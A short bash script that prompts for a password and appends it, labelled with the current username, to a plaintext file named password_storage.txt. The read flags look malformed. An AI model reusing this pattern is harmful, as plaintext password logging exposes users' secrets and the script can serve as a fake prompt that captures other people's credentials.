#! /bin/bash

read -ps "Password: " 
echo "Password $USER is: $REPLY" >>  password_storage.txt
